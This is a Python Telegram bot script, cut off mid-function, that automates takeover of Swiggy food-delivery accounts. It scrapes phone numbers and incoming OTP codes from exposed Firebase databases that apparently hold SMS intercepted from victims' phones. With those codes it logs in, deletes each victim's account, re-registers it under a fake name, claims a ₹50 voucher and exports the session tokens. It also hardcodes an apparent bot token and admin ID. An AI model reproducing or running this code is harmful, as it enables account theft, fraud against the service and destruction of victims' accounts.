#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║       🔥 SWIGGY MASTER BOT v3 — FIXED 🔥            ║
╚══════════════════════════════════════════════════════╝
pip install python-telegram-bot==20.7 requests
python bot.py
"""

import asyncio, json, os, re, sqlite3, time, base64, random, logging
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters,
)
from telegram.constants import ParseMode

# ════════════════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════════════════
BOT_TOKEN    = "8796194701:AAH0Y-K14jdQJFA2zYc0TgWGozOU2n2rfQA"   # @BotFather se
ADMIN_IDS    = [6420941417]        # @userinfobot se apna ID
DB_FILE      = "swiggy.db"
OTP_TIMEOUT  = 30
OTP_INTERVAL = 2
DEF_WORKERS  = 10

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO
)
log = logging.getLogger(__name__)

FAKE_NAMES = [
    "Rahul Sharma","Priya Singh","Amit Kumar","Neha Gupta",
    "Rohit Verma","Pooja Mishra","Suresh Patel","Anjali Rao",
    "Vikram Nair","Kavita Joshi","Deepak Tiwari","Sunita Pandey",
    "Rajesh Yadav","Meena Agarwal","Ashok Mehta","Sanjay Dubey",
]

# ════════════════════════════════════════════════════
#  DB
# ════════════════════════════════════════════════════
_db_lock = asyncio.Lock()

def db_conn():
    c = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=10)
    c.row_factory = sqlite3.Row
    c.execute("PRAGMA journal_mode=WAL")
    return c

def init_db():
    with db_conn() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS panels (
            id      INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            url     TEXT,
            UNIQUE(user_id, url)
        );
        CREATE TABLE IF NOT EXISTS accounts (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id     INTEGER,
            mobile      TEXT,
            customer_id TEXT DEFAULT '',
            name        TEXT DEFAULT '',
            token       TEXT DEFAULT '',
            tid         TEXT DEFAULT '',
            sid         TEXT DEFAULT '',
            device_id   TEXT DEFAULT '',
            source      TEXT DEFAULT 'firebase',
            created     TEXT DEFAULT (datetime('now','localtime')),
            offer_done  INTEGER DEFAULT 0,
            deleted_ok  INTEGER DEFAULT 0,
            UNIQUE(user_id, mobile)
        );
        CREATE TABLE IF NOT EXISTS stats (
            user_id   INTEGER PRIMARY KEY,
            success   INTEGER DEFAULT 0,
            processed INTEGER DEFAULT 0,
            deleted   INTEGER DEFAULT 0,
            offers    INTEGER DEFAULT 0
        );
        """)

def db_exec(sql, params=()):
    with db_conn() as c:
        cur = c.execute(sql, params)
        c.commit()
        return cur

def db_fetch(sql, params=()):
    with db_conn() as c:
        return c.execute(sql, params).fetchall()

def db_one(sql, params=()):
    with db_conn() as c:
        return c.execute(sql, params).fetchone()

def inc_stat(uid, col, n=1):
    db_exec(f"""
        INSERT INTO stats(user_id,{col}) VALUES(?,?)
        ON CONFLICT(user_id) DO UPDATE SET {col}={col}+?
    """, (uid, n, n))

def get_stats(uid):
    row    = db_one("SELECT * FROM stats WHERE user_id=?", (uid,))
    panels = db_one("SELECT COUNT(*) FROM panels WHERE user_id=?", (uid,))[0]
    accs   = db_one("SELECT COUNT(*) FROM accounts WHERE user_id=?", (uid,))[0]
    gsucc  = db_one("SELECT COALESCE(SUM(success),0) FROM stats")[0]
    base   = {"success":0,"processed":0,"deleted":0,"offers":0}
    if row: base.update(dict(row))
    base.update({"panels":panels,"accounts":accs,"global":gsucc})
    return base

# ════════════════════════════════════════════════════
#  FIREBASE
# ════════════════════════════════════════════════════
PHONE_RE = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")

def parse_fb(link):
    link = link.strip()
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        if link.startswith("http"):
            return link.rstrip("/") + "/"
    try:
        parsed = urlparse(link)
        enc    = parse_qs(parsed.query).get("s",[None])[0]
        if enc:
            enc += "=" * (-len(enc) % 4)
            dec  = base64.b64decode(enc).decode().split("|")[0].strip()
            if "firebaseio.com" in dec or "firebasedatabase.app" in dec:
                return dec.rstrip("/") + "/"
    except Exception:
        pass
    return None

def is_online(d):
    if not isinstance(d, dict): return False
    for k in ("status","state","online","isOnline","connected","isConnected"):
        v = d.get(k)
        if v is True or v == 1: return True
        if isinstance(v,str) and v.lower() in {"true","online","connected","active","ready"}: return True
    return False

def fb_get_phone(msgs):
    from collections import Counter
    c = Counter()
    for m in (msgs or {}).values():
        if not isinstance(m, dict): continue
        body = str(m.get("body") or m.get("message") or m.get("text") or "")
        for num in PHONE_RE.findall(body):
            c[num] += 1
    return c.most_common(1)[0][0] if c else None

def _fb_scan_one(url):
    try:
        s  = _make_sess()
        cr = s.get(f"{url}clients.json",  timeout=(4,10))
        mr = s.get(f"{url}messages.json", timeout=(4,15))
        cl = cr.json() if cr.ok else {}
        ms = mr.json() if mr.ok else {}
        out = []
        for cid, cdata in (cl or {}).items():
            if not is_online(cdata): continue
            msgs  = (ms or {}).get(cid, {})
            phone = fb_get_phone(msgs) if isinstance(msgs,dict) else None
            if phone:
                out.append({"phone":phone,"client_id":cid,"fb_url":url})
        return out
    except Exception:
        return []

def _poll_otp(fb_url, cid, after_ms, timeout=None):
    timeout  = timeout or OTP_TIMEOUT
    deadline = time.time() + timeout
    url      = f"{fb_url}messages/{cid}.json"
    s        = _make_sess()
    while time.time() < deadline:
        time.sleep(OTP_INTERVAL)
        try:
            msgs = s.get(url, timeout=(3,10)).json()
            if not isinstance(msgs, dict): continue
            for mid, msg in msgs.items():
                try:
                    if int(mid) < (after_ms - 60_000): continue
                except Exception: pass
                if not isinstance(msg, dict): continue
                body = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                m = re.search(r"(?<!\d)(\d{4,6})(?!\d)", body)
                if m: return m.group(1)
        except Exception:
            pass
    return ""

# ════════════════════════════════════════════════════
#  SWIGGY API
# ════════════════════════════════════════════════════
SWIGGY = "https://profile.swiggy.com"
EVENTS = "https://events.swiggy.com"

def _make_sess(token=""):
    s = requests.Session()
    r = Retry(total=2, backoff_factor=0.3, status_forcelist=[500,502,503,504])
    s.mount("https://", HTTPAdapter(max_retries=r))
    s.headers.update({
        "User-Agent":      "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
        "Accept":          "application/json, text/plain, */*",
        "Accept-Language": "en-IN,en;q=0.9",
        "Origin":          "https://www.swiggy.com",
        "Referer":         "https://www.swiggy.com/",
        "Content-Type":    "application/json",
    })
    if token:
        s.headers["Authorization"] = f"Bearer {token}"
    return s

def sw_send_otp(mobile):
    try:
        r = _make_sess().get(f"{SWIGGY}/api/v3/app/sms_otp",
                             params={"mobile": mobile}, timeout=(5,15))
        return r.status_code in (200,201)
    except Exception: return False

def sw_verify(otp):
    try:
        r = _make_sess().post(
            f"{SWIGGY}/api/v3/app/login/verify",
            params={"otp_source":"Sms-automatic"},
            json={"otp": otp}, timeout=(5,15),
        )
        if r.status_code in (200,201): return r.json()
    except Exception: pass
    return {}

def sw_update_name(token, name, mobile):
    try:
        r = _make_sess(token).post(
            f"{SWIGGY}/api/v1/user/update",
            json={"name": name, "mobile": mobile}, timeout=(5,15),
        )
        return r.status_code in (200,201)
    except Exception: return False

def sw_delete_check(token):
    try:
        r = _make_sess(token).get(f"{SWIGGY}/api/v1/delete/user_check", timeout=(5,15))
        return r.status_code in (200,201)
    except Exception: return False

def sw_delete_confirm(token, otp):
    try:
        r = _make_sess(token).post(f"{SWIGGY}/api/v1/delete/user",
                                    json={"otp": otp}, timeout=(5,15))
        return r.status_code in (200,201)
    except Exception: return False

def sw_night_offer(token):
    try:
        s   = _make_sess(token)
        day = datetime.now().strftime("%a").lower()
        s.get(f"{EVENTS}/pick-your-late-night-offer", timeout=10)
        time.sleep(0.3)
        r = s.post(f"{EVENTS}/api/notify",
                   json={"campaign": f"byo-ln-v3-{day}", "value": 1},
                   timeout=(5,15))
        return r.status_code in (200,201)
    except Exception: return False

def parse_acc(resp):
    data = resp.get("data", {}) or {}
    return {
        "token":       data.get("token","")     or resp.get("token",""),
        "tid":         data.get("tid","")        or resp.get("tid",""),
        "sid":         data.get("sid","")        or resp.get("sid",""),
        "customer_id": data.get("customerId","") or str(data.get("id","")),
        "name":        data.get("name","")       or resp.get("name",""),
        "device_id":   data.get("deviceId","")   or resp.get("deviceId",""),
    }

def save_acc(uid, mobile, acc, source="firebase"):
    db_exec("""
        INSERT OR REPLACE INTO accounts
        (user_id,mobile,customer_id,name,token,tid,sid,device_id,source)
        VALUES(?,?,?,?,?,?,?,?,?)
    """, (uid, mobile, acc["customer_id"], acc["name"],
          acc["token"], acc["tid"], acc["sid"], acc["device_id"], source))

def to_json(acc):
    return {
        "name":       acc["name"]        or "",
        "customerId": acc["customer_id"] or "",
        "mobile":     acc["mobile"]      or "",
        "token":      acc["token"]       or "",
        "tid":        acc["tid"]         or "",
        "sid":        acc["sid"]         or "",
        "deviceId":   acc["device_id"]   or "",
    }

# ════════════════════════════════════════════════════
#  FULL FLOW: Login→Delete→ReLogin→Name→Offer
# ════════════════════════════════════════════════════
async def full_flow(uid, device, loop):
    phone  = device["phone"]
    cid    = device["client_id"]
    fb_url = device["fb_url"]
    res    = {"phone": phone, "ok": False, "step": "", "data": {}, "offer": False}

    # 1. Login OTP
    res["step"] = "login_otp"
    t1 = int(time.time()*1000)
    if not await loop.run_in_executor(None, sw_send_otp, phone):
        return res

    otp1 = await loop.run_in_executor(None, _poll_otp, fb_url, cid, t1)
    if not otp1:
        res["step"] = "login_otp_timeout"; return res

    resp1 = await loop.run_in_executor(None, sw_verify, otp1)
    if not resp1:
        res["step"] = "login_fail"; return res
    acc1 = parse_acc(resp1)
    if not acc1["token"]:
        res["step"] = "no_token"; return res

    # 2. Delete
    res["step"] = "delete"
    t2 = int(time.time()*1000)
    if not await loop.run_in_executor(None, sw_delete_check, acc1["token"]):
        res["step"] = "delete_check_fail"; return res

    otp2 = await loop.run_in_executor(None, _poll_otp, fb_url, cid, t2)
    if not otp2:
        res["step"] = "delete_otp_timeout"; return res

    del_ok = await loop.run_in_executor(None, sw_delete_confirm, acc1["token"], otp2)
    if not del_ok:
        res["step"] = "delete_fail"; return res

    db_exec("UPDATE accounts SET deleted_ok=1 WHERE user_id=? AND mobile=?", (uid, phone))
    inc_stat(uid, "deleted")
    await asyncio.sleep(1.5)

    # 3. Re-Login
    res["step"] = "relogin"
    t3 = int(time.time()*1000)
    if not await loop.run_in_executor(None, sw_send_otp, phone):
        res["step"] = "relogin_otp_fail"; return res

    otp3 = await loop.run_in_executor(None, _poll_otp, fb_url, cid, t3)
    if not otp3:
        res["step"] = "relogin_otp_timeout"; return res

    resp2 = await loop.run_in_executor(None, sw_verify, otp3)
    if not resp2:
        res["step"] = "relogin_fail"; return res
    acc2 = parse_acc(resp2)
    if not acc2["token"]:
        res["step"] = "relogin_no_token"; return res

    # 4. Name
    res["step"] = "name"
    name = random.choice(FAKE_NAMES)
    await loop.run_in_executor(None, sw_update_name, acc2["token"], name, phone)
    acc2["name"] = name

    # 5. Night Offer
    res["step"] = "offer"
    offer_ok = await loop.run_in_executor(None, sw_night_offer, acc2["token"])
    if offer_ok:
        db_exec("UPDATE accounts SET offer_done=1 WHERE user_id=? AND mobile=?", (uid, phone))
        inc_stat(uid, "offers")

    # 6. Save
    save_acc(uid, phone, acc2)
    inc_stat(uid, "success")
    res.update({"ok": True, "step": "done", "offer": offer_ok,
                "data": {**to_json({**acc2,"mobile":phone})}})
    return res

# ════════════════════════════════════════════════════
#  KEYBOARDS
# ════════════════════════════════════════════════════
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Auto Mode",        callback_data="m_auto"),
         InlineKeyboardButton("📊 Statistics",        callback_data="m_stats")],
        [InlineKeyboardButton("📋 Firebase Panels",   callback_data="m_panels")],
        [InlineKeyboardButton("💾 Saved Accounts",    callback_data="m_saved"),
         InlineKeyboardButton("📤 Export JSON",        callback_data="m_export")],
        [InlineKeyboardButton("📂 Import JSON",       callback_data="m_import"),
         InlineKeyboardButton("🎁 Vouchers",           callback_data="m_vouchers")],
        [InlineKeyboardButton("🌙 Night Offer (All)", callback_data="m_offer_all"),
         InlineKeyboardButton("📱 Manual Number",      callback_data="m_manual")],
    ])

def kb_auto():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ Start (10 workers)",  callback_data="a_start_10")],
        [InlineKeyboardButton("⚙️ Custom Workers",      callback_data="a_custom")],
        [InlineKeyboardButton("◀️ Back",               callback_data="m_back")],
    ])

def kb_panels():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Add Firebase Link",  callback_data="p_add_link")],
        [InlineKeyboardButton("📁 Upload TXT File",    callback_data="p_add_file")],
        [InlineKeyboardButton("📋 View Panels",         callback_data="p_list"),
         InlineKeyboardButton("🗑️ Clear All",          callback_data="p_clear")],
        [InlineKeyboardButton("◀️ Back",               callback_data="m_back")],
    ])

def kb_export():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 Single (Latest)",    callback_data="e_single")],
        [InlineKeyboardButton("📦 Bulk (All)",         callback_data="e_bulk")],
        [InlineKeyboardButton("◀️ Back",               callback_data="m_back")],
    ])

def kb_back():
    return InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data="m_back")]])

# ════════════════════════════════════════════════════
#  SAFE HANDLER WRAPPER
# ════════════════════════════════════════════════════
def safe(fn):
    """Wrap callback — shows error to user instead of silent crash."""
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        try:
            await fn(update, ctx)
        except Exception as e:
            log.exception(f"Error in {fn.__name__}: {e}")
            try:
                q = update.callback_query
                if q:
                    await q.answer("⚠️ Error aaya, dobara try karo.")
                    await q.edit_message_text(
                        f"❌ *Error:* `{str(e)[:100]}`\n\n/start se wapas jao.",
                        reply_markup=kb_back(), parse_mode=ParseMode.MARKDOWN,
                    )
            except Exception:
                pass
    return wrapper

# ════════════════════════════════════════════════════
#  STATE
# ════════════════════════════════════════════════════
user_state = {}
WELCOME = (
    "🔥 *SWIGGY MASTER BOT* 🔥\n"
    "━━━━━━━━━━━━━━━━━━━━\n"
    "🌙 Auto Flow:\n"
    "`Login → Delete → Re-Login`\n"
    "`→ Name → Night Offer → JSON`\n"
    "━━━━━━━━━━━━━━━━━━━━\n"
    "👇 Option select karo:"
)

# ════════════════════════════════════════════════════
#  HANDLERS
# ════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Access denied.")
        return
    init_db()
    await update.message.reply_text(
        WELCOME, reply_markup=kb_main(), parse_mode=ParseMode.MARKDOWN
    )

@safe
async def cb_back(update, ctx):
    q = update.callback_query; await q.answer()
    await q.edit_message_text(WELCOME, reply_markup=kb_main(), parse_mode=ParseMode.MARKDOWN)

@safe
async def cb_stats(update, ctx):
    q = update.callback_query; await q.answer()
    s = get_stats(q.from_user.id)
    await q.edit_message_text(
        f"📊 *Statistics*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ Success       : `{s['success']}`\n"
        f"📱 Processed     : `{s['processed']}`\n"
        f"🗑️ Deleted       : `{s['deleted']}`\n"
        f"🎁 Offers        : `{s['offers']}`\n"
        f"📋 Panels        : `{s['panels']}`\n"
        f"💾 Accounts      : `{s['accounts']}`\n"
        f"🌐 Global Success: `{s['global']}`",
        reply_markup=kb_back(), parse_mode=ParseMode.MARKDOWN,
    )

# ── PANELS ──────────────────────────────────────────

@safe
async def cb_panels(update, ctx):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    n   = db_one("SELECT COUNT(*) FROM panels WHERE user_id=?", (uid,))[0]
    await q.edit_message_text(
        f"📋 *Firebase Panels*\n\n`{n}` panels saved hain.\n\nOption select karo:",
        reply_markup=kb_panels(), parse_mode=ParseMode.MARKDOWN,
    )

@safe
async def cb_p_add_link(update, ctx):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    user_state[uid] = {"action": "panel_link"}
    await q.edit_message_text(
        "🔗 *Firebase Link Bhejo*\n\n"
        "Ek ya multiple links bhejo\n"
        "_(ek line = ek URL)_\n\n"
        "Example:\n`https://xxx.firebaseio.com/`",
        parse_mode=ParseMode.MARKDOWN,
    )

@safe
async def cb_p_add_file(update, ctx):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    user_state[uid] = {"action": "panel_file"}
    await q.edit_message_text(
        "📁 *TXT File Upload Karo*\n\n"
        "Firebase URLs wali `.txt` file bhejo\n"
        "_(ek line = ek URL)_",
        parse_mode=ParseMode.MARKDOWN,
    )

@safe
async def cb_p_list(update, ctx):
    q = update.callback_query; await q.answer()
    uid  = q.from_user.id
    rows = db_fetch("SELECT url FROM panels WHERE user_id=? LIMIT 25", (uid,))
    if not rows:
        text = "📋 *Panels*\n\nKoi panel nahi hai abhi.\nAdd karo:"
    else:
        lines = [f"`{i+1}.` `{r['url'][:48]}...`" for i, r in enumerate(rows)]
        text  = f"📋 *Panels* ({len(rows)})\n\n" + "\n".join(lines)
    await q.edit_messsage_text(text, reply_markup=kb_panels(), parse_mode=ParseMode.MARKDOWN)

@safe
async def cb_p_clear(update, ctx):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    n   = db_exec("DELETE FROM panels WHERE user_id=?", (uid,)).rowcount
    await q.edit_message_text(
        f"🗑️ `{n}` panels delete ho gaye.",
        reply_markup=kb_panels(), parse_mode=ParseMode.MARKDOWN,
    )

# ── AUTO MODE ─────────────────────────────────────────

@safe
async def cb_auto(update, ctx):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    n   = db_one("SELECT COUNT(*) FROM panels WHERE user_id=?", (uid,))[0]
    await q.edit_message_text(
        f"🚀 *Auto Mode*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📋 Panels: `{n}`\n\n"
        f"🔄 *Flow per number:*\n"
        f"1️⃣ Login OTP → Firebase capture\n"
        f"2️⃣ Account Delete → OTP capture\n"
        f"3️⃣ Re-Login → OTP capture\n"
        f"4️⃣ Name set (auto random)\n"
        f"5️⃣ Night Offer ₹50 claim\n"
        f"6️⃣ JSON save\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Start karo:",
        reply_markup=kb_auto(), parse_mode=ParseMode.MARKDOWN,
    )

@safe
async def cb_a_start_10(update, ctx):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    await q.edit_message_text("⏳ Processing shuru ho raha hai...", parse_mode=ParseMode.MARKDOWN)
    asyncio.create_task(_do_auto(uid, DEF_WORKERS, ctx.bot))

@safe
async def cb_a_custom(update, ctx):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    user_state[uid] = {"action": "set_workers"}
    await q.edit_message_text(
        "⚙️ *Workers set karo*\n\nNumber bhejo (1-100):",
        parse_mode=ParseMode.MARKDOWN,
    )

async def _do_auto(uid, workers, bot):
    try:
        panel_rows = db_fetch("SELECT url FROM panels WHERE user_id=?", (uid,))
        urls = [r["url"] for r in panel_rows]
        if not urls:
            await bot.send_message(uid, "❌ Pehle Firebase panels add karo!", reply_markup=kb_panels())
            return

        await bot.send_message(uid, f"🔍 *{len(urls)} panels scan ho rahi hain...*",
                                parse_mode=ParseMode.MARKDOWN)

        found = []
        with ThreadPoolExecutor(max_workers=50) as ex:
            results = list(ex.map(_fb_scan_one, urls))
        seen, devices = set(), []
        for devs in results:
            for d in devs:
                if d["phone"] not in seen:
                    seen.add(d["phone"]); devices.append(d)

        if not devices:
            await bot.send_message(uid, "❌ Koi online device nahi mila. Panels check karo.")
            return

        await bot.send_message(
            uid,
            f"📱 *{len(devices)} numbers* mila!\n⚙️ Workers: `{workers}`\n⏳ Processing...",
            parse_mode=ParseMode.MARKDOWN,
        )

        loop    = asyncio.get_event_loop()
        success = fail = 0

        for i in range(0, len(devices), workers):
            batch   = devices[i:i+workers]
            tasks   = [full_flow(uid, d, loop) for d in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for r in results:
                if isinstance(r, Exception):
                    fail += 1
                    continue
                if r.get("ok"):
                    success += 1
                    d = r["data"]
                    await bot.send_message(
                        uid,
                        f"✅ `{r['phone']}`\n"
                        f"👤 `{d.get('name','')}`\n"
                        f"🎁 Offer: {'✅ Claimed' if r.get('offer') else '❌ Failed'}\n"
                        f"🔑 `{d.get('token','')[:25]}...`",
                        parse_mode=ParseMode.MARKDOWN,
                    )
                else:
                    fail += 1
                    await bot.send_message(
                        uid,
                        f"❌ `{r.get('phone','')}` — Step: `{r.get('step','?')}`",
                        parse_mode=ParseMode.MARKDOWN,
                    )

        inc_stat(uid, "processed", len(devices))

        await bot.send_message(
            uid,
            f"🏁 *Complete!*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Success : `{success}`\n"
            f"❌ Failed  : `{fail}`\n"
            f"📱 Total   : `{len(devices)}`",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📄 Single JSON", callback_data="e_single"),
                 InlineKeyboardButton("📦 Bulk JSON",   callback_data="e_bulk")],
                [InlineKeyboardButton("🏠 Menu",         callback_data="m_back")],
            ]),
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception as e:
        log.exception(e)
        await bot.send_message(uid, f"❌ Auto mode error: {e}")

# ── MANUAL ────────────────────────────────────────────

@safe
async def cb_manual(update, ctx):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    user_state[uid] = {"action": "manual_num"}
    await q.edit_message_text(
        "📱 *Manual Number*\n\n"
        "10-digit mobile number bhejo:",
        parse_mode=ParseMode.MARKDOWN,
    )

# ── NIGHT OFFER ALL ───────────────────────────────────

@safe
async def cb_offer_all(update, ctx):
    q = update.callback_query; await q.answer()
    uid  = q.from_user.id
    accs = db_fetch(
        "SELECT * FROM accounts WHERE user_id=? AND offer_done=0 AND token!=''", (uid,)
    )
    if not accs:
        await q.edit_message_text(
            "✅ Sab accounts pe offer already claim ho gaya!",
            reply_markup=kb_back(),
        ); return
    await q.edit_message_text(f"🌙 *{len(accs)} accounts pe Night Offer claim ho raha hai...*",
                               parse_mode=ParseMode.MARKDOWN)
    loop = asyncio.get_event_loop()
    done = 0
    for acc in accs:
        ok = await loop.run_in_executor(None, sw_night_offer, acc["token"])
        if ok:
            done += 1
            db_exec("UPDATE accounts SET offer_done=1 WHERE id=?", (acc["id"],))
            inc_stat(uid, "offers")
    await ctx.bot.send_message(
        uid,
        f"🌙 *Night Offer Done!*\n\n✅ Claimed: `{done}/{len(accs)}`",
        reply_markup=kb_back(), parse_mode=ParseMode.MARKDOWN,
    )

# ── SAVED ─────────────────────────────────────────────

@safe
async def cb_saved(update, ctx):
    q = update.callback_query; await q.answer()
    uid  = q.from_user.id
    accs = db_fetch(
        "SELECT * FROM accounts WHERE user_id=? ORDER BY id DESC LIMIT 8", (uid,)
    )
    tot  = db_one("SELECT COUNT(*) FROM accounts WHERE user_id=?", (uid,))[0]
    if not accs:
        await q.edit_message_text("💾 Koi account nahi.", reply_markup=kb_back()); return
    lines = []
    for a in accs:
        lines.append(
            f"📱 `{a['mobile']}` · 👤 `{a['name'] or 'N/A'}` · 🎁 {'✅' if a['offer_done'] else '❌'}"
        )
    await q.edit_message_text(
        f"💾 *Saved Accounts* ({tot} total, showing last 8)\n\n" + "\n".join(lines),
        reply_markup=kb_export(), parse_mode=ParseMode.MARKDOWN,
    )

# ── EXPORT ────────────────────────────────────────────

@safe
async def cb_export(update, ctx):
    q = update.callback_query; await q.answer()
    await q.edit_message_text(
        "📤 *JSON Export*\n\nKaunsa format chahiye?",
        reply_markup=kb_export(), parse_mode=ParseMode.MARKDOWN,
    )

@safe
async def cb_e_single(update, ctx):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    acc = db_one("SELECT * FROM accounts WHERE user_id=? ORDER BY id DESC LIMIT 1", (uid,))
    if not acc:
        await q.edit_message_text("❌ Koi account nahi.", reply_markup=kb_back()); return
    data = to_json(dict(acc))
    await ctx.bot.send_message(
        uid,
        f"📄 *Single JSON (Latest):*\n```json\n{json.dumps(data, indent=2)}\n```",
        parse_mode=ParseMode.MARKDOWN,
    )

@safe
async def cb_e_bulk(update, ctx):
    q = update.callback_query; await q.answer()
    uid  = q.from_user.id
    accs = db_fetch("SELECT * FROM accounts WHERE user_id=?", (uid,))
    if not accs:
        await q.edit_message_text("❌ Koi account nahi.", reply_markup=kb_back()); return
    data  = [to_json(dict(a)) for a in accs]
    fname = f"swiggy_{uid}_{int(time.time())}.json"
    with open(fname, "w") as f:
        json.dump(data, f, indent=2)
    await ctx.bot.send_document(
        uid, document=open(fname,"rb"),
        caption=f"📦 *Bulk Export — {len(data)} accounts*",
        parse_mode=ParseMode.MARKDOWN,
    )
    os.remove(fname)

# ── IMPORT ────────────────────────────────────────────

@safe
async def cb_import(update, ctx):
    q = update.callback_query; await q.answer()
    user_state[q.from_user.id] = {"action": "import_json"}
    await q.edit_message_text(
        "📂 *JSON Import*\n\n"
        "JSON file ya text bhejo.\n\n"
        "*Format:*\n"
        "```json\n"
        '{"mobile":"9999999999","token":"xxx",\n'
        ' "name":"Rahul","customerId":"123",\n'
        ' "tid":"xxx","sid":"xxx","deviceId":"xxx"}\n'
        "```\n"
        "_Single object ya array — dono OK_",
        parse_mode=ParseMode.MARKDOWN,
    )

# ── VOUCHERS ──────────────────────────────────────────

@safe
async def cb_vouchers(update, ctx):
    q = update.callback_query; await q.answer()
    uid     = q.from_user.id
    total   = db_one("SELECT COUNT(*) FROM accounts WHERE user_id=?", (uid,))[0]
    claimed = db_one("SELECT COUNT(*) FROM accounts WHERE user_id=? AND offer_done=1", (uid,))[0]
    pending = total - claimed
    await q.edit_message_text(
        f"🎁 *Vouchers — Night Offer (₹50)*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ Claimed : `{claimed}`\n"
        f"⏳ Pending : `{pending}`\n"
        f"📱 Total   : `{total}`",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🌙 Claim Remaining", callback_data="m_offer_all")],
            [InlineKeyboardButton("◀️ Back",            callback_data="m_back")],
        ]),
        parse_mode=ParseMode.MARKDOWN,
    )

# ════════════════════════════════════════════════════
#  MESSAGE HANDLER
# ════════════════════════════════════════════════════

async def msg_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid    = update.effective_user.id
    if uid not in ADMIN_IDS: return
    msg    = update.message
    text   = (msg.text or "").strip()
    doc    = msg.document
    state  = user_state.get(uid, {})
    action = state.get("action", "")

    try:
        if action == "panel_link":
            lines = [l.strip() for l in text.splitlines() if l.strip()]
            added = 0
            for line in lines:
                url = parse_fb(line)
                if url:
                    try:
                        db_exec("INSERT OR IGNORE INTO panels(user_id,url) VALUES(?,?)", (uid,url))
                        added += 1
                    except Exception: pass
            user_state.pop(uid, None)
            await msg.reply_text(
                f"✅ `{added}` panels add ho gaye!",
                reply_markup=kb_panels(), parse_mode=ParseMode.MARKDOWN,
            )

        elif action == "panel_file" and doc:
            f    = await ctx.bot.get_file(doc.file_id)
            path = f"/tmp/p_{uid}.txt"
            await f.download_to_drive(path)
            with open(path) as fl:
                lines = [l.strip() for l in fl if l.strip()]
            os.remove(path)
            added = 0
            for line in lines:
                url = parse_fb(line)
                if url:
                    try:
                        db_exec("INSERT OR IGNORE INTO panels(user_id,url) VALUES(?,?)", (uid,url))
                        added += 1
                    except Exception: pass
            user_state.pop(uid, None)
            await msg.reply_text(
                f"✅ File se `{added}` panels add ho gaye!",
                reply_markup=kb_panels(), parse_mode=ParseMode.MARKDOWN,
            )

        elif action == "set_workers":
            try:
                w = max(1, min(100, int(text)))
            except ValueError:
                await msg.reply_text("❌ 1-100 ke beech number daalo."); return
            user_state.pop(uid, None)
            await msg.reply_text(
                f"⚙️ Workers: `{w}` — Processing shuru...",
                parse_mode=ParseMode.MARKDOWN,
            )
            asyncio.create_task(_do_auto(uid, w, ctx.bot))

        elif action == "import_json":
            raw = text
            if doc:
                f    = await ctx.bot.get_file(doc.file_id)
                path = f"/tmp/j_{uid}.json"
                await f.download_to_drive(path)
                with open(path) as fl: raw = fl.read()
                os.remove(path)
            data = json.loads(raw)
            if isinstance(data, dict): data = [data]
            added = 0
            for item in data:
                save_acc(uid, item.get("mobile",""), {
                    "customer_id": item.get("customerId",""),
                    "name":        item.get("name",""),
                    "token":       item.get("token",""),
                    "tid":         item.get("tid",""),
                    "sid":         item.get("sid",""),
                    "device_id":   item.get("deviceId",""),
                }, source="json")
                added += 1
            user_state.pop(uid, None)
            await msg.reply_text(
                f"✅ `{added}` accounts import ho gaye!",
                reply_markup=kb_back(), parse_mode=ParseMode.MARKDOWN,
            )

        elif action == "manual_num":
            phone = re.sub(r"[^0-9]","",text)[-10:]
            if not re.match(r"^[6-9]\d{9}$", phone):
                await msg.reply_text("❌ Valid 10-digit number daalo."); return
            user_state.pop(uid, None)
            await msg.reply_text(
                f"📱 `{phone}` pe OTP bhej raha hai...",
                parse_mode=ParseMode.MARKDOWN,
            )
            loop = asyncio.get_event_loop()
            ok   = await loop.run_in_executor(None, sw_send_otp, phone)
            if ok:
                user_state[uid] = {"action": "manual_otp", "phone": phone}
                await msg.reply_text(f"✅ OTP bhej diya! Ab OTP bhejo:")
            else:
